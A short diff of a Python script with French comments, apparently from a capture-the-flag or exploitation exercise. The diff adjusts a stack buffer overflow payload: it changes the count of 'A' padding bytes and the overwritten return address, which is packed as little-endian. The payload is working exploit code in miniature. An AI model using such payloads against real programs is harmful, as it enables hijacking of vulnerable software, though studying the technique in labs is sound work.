@@ -1,11 +1,10 @@
 import struct
 
-adresse = 0x8048444
+adresse = 0x08048454
 adresse_little_endian = struct.pack("<I", adresse)  # "<I" = little-endian, 4 octets
 print(adresse_little_endian)
 
-# Construction de la payload
-buffer = b"A" * 76
+buffer = b"A" * 72
 
 payload = buffer + adresse_little_endian
 
